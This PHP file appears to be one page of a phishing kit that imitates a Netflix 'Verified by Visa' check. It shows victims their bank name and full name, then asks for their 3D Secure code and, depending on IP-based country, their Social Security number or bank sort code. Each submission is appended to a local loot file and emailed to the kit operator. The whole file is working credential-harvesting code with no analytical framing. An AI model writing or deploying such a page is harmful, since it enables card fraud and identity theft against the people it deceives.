<?php
error_reporting(0);
session_start();
require_once("../inc/logs.php");
require_once("../main/actions/Email.php");
$url = "https://lookup.binlist.net/".str_replace("", "", substr($_SESSION['cardnumber'], 0, 9));
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_TIMEOUT,10);
$output = curl_exec($ch);
$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
$output = json_decode($output);
$bank_name = $output->bank->name;
$ip = $_SERVER['REMOTE_ADDR'];
$ch = curl_init("http://ip-api.com/json/".$ip);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_TIMEOUT,10);
$country_json = curl_exec($ch);
curl_close($ch);
$country_json = json_decode($country_json, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    $country_json = null;
}
$ssn = false;
$soc = false;
$country = "";
if(!$country_json->country) {
  $ssn = false;
  $soc = false;
} else {
  $country = $country_json["country"];
  if($country == "United States") {
    $ssn = true;
    $soc = false;
  } else if($country == "United Kingdom") {
    $ssn = false;
    $soc = true;
  } else if($country == "Canada") {
    header("location: account/done.php");
  } else {
    $ssn = false;
    $soc = true;
  }
}
if(isset($_POST['password_vbv'])) {
  $passvbv = $_POST['password_vbv'];
  $ssncode = "";
  $socode = "";
  if($ssn) {
    $ssncode = $_POST['ssn_vbv'];
  }
  if($soc) {
    $socode = $_POST['soc_vbv'];
  }
  $card_number = $_SESSION['cardnumber']." ".$passvbv." ".$ssncode." ".$socode;
  $msg = "
|😈|############[🔔_NETFLIX_LOGIN_VBV_🔔]############|😈|
|✅| 3D Sec : $passvbv
|✅| SSN : $ssncode
|✅| SOC : $socode
|✅| IP : $ip
|😈|###############################################|😈|
";
$save=fopen("../rselt/NETFLIX_vbv","a+");fwrite($save,$msg);fclose($save);
mail($setting["mail_to"], "NETFLIX | VBV [$ip] *** ", $msg." ".$bin_check);
header("location: account/done.php");
}
?>
<meta charset="utf-8">
<center>
<div class="content_check" style="margin-left: 2px;width: 288px;border: solid 1px red;padding: 25px;">
 <img src="assets/vbv.gif" style="width: 90px;float:left;"><img src="assets/logo.jpg" style="float: right;display: inline-block" width="100px"> 	<div style="clear:both;"></div>
  <p style="font-size: 13px; margin-top: 25px; color: #807979;">Please enter your Secure Code </p>
  <table align="center" width="290" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 30px;">
   <tbody>
    <tr>
     <td align="left">Bank : <?php echo $bank_name; ?></td>
     <td></td>
    </tr>
   <tr>
     <td align="left">Full name :  <?php echo $_SESSION['fname']; ?></td>
    </tr>
    <form method="post" action="" style="float: left;">
    <tr style="float: left;">
      <input name="flow_name" value="summary/index" type="hidden">
      <input name="flow_name" value="summary/index" type="hidden">
       <td align="right">3D Secure :</td> <td><input style="width: 75px;" type="text" placeholder="3D secure" name="password_vbv"></td><br>       <tr>
       </tr>
    </tr>
    <?php
    if($ssn) {
      ?>
      <tr style="float: left;">
         <td align="right">Social security number :</td> <td><input style="width: 75px;" type="text" placeholder="SSN" name="ssn_vbv"></td><br>       <tr>
         </tr>
      </tr>
      <?php
    }
    ?>
    <?php
    if($soc) {
      ?>
      <tr style="float: left;">
         <td align="right">Sort code :</td> <td><input style="width: 75px;" type="text" placeholder="Sort code" name="soc_vbv"></td><br>       <tr>
         </tr>
      </tr>
      <?php
    }
    ?>
    <tr>
     <td></td>
     <td>
      <br>
      <input name="confirm" style="width: 74px; float: center;" type="submit" value="Submit"> </td>
    </tr>
    </form>
   </tbody>
  </table>
  <p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565"> Copyright © 1999-<? echo date("Y"); ?> . All rights reserved. </p>
</div>
</center>
